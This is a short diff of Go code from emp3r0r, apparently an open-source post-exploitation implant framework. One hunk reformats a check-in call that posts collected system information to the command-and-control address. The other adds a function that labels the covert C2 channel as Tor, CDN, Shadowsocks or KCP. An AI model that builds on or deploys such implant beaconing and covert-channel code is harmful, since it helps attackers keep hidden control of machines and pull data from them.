@@ -32,7 +32,10 @@ func CheckIn() error {
 	if err != nil {
 		return err
 	}
-	_, err = emp3r0r_data.HTTPClient.Post(emp3r0r_data.CCAddress+tun.CheckInAPI+"/"+uuid.NewString(), "application/json", bytes.NewBuffer(sysinfoJSON))
+	_, err = emp3r0r_data.HTTPClient.Post(
+		emp3r0r_data.CCAddress+tun.CheckInAPI+"/"+uuid.NewString(),
+		"application/json",
+		bytes.NewBuffer(sysinfoJSON))
 	if err != nil {
 		return err
 	}
@@ -190,4 +193,26 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		err = fmt.Errorf("ctx: %v\nerr: %v", ctx.Err(), err)
 	}
 	return err
+}
+
+// set C2Transport
+func setC2Transport() {
+
+	if tun.IsTor(emp3r0r_data.CCAddress) {
+		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
+		return
+	}
+	if RuntimeConfig.CDNProxy != "" {
+		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", RuntimeConfig.CDNProxy)
+		return
+	}
+
+	if RuntimeConfig.UseShadowsocks {
+		emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s)", RuntimeConfig.ShadowsocksPort)
+		// ss thru KCP
+		if RuntimeConfig.UseKCP {
+			emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s)",
+				RuntimeConfig.ShadowsocksPort, RuntimeConfig.KCPPort)
+		}
+	}
 }
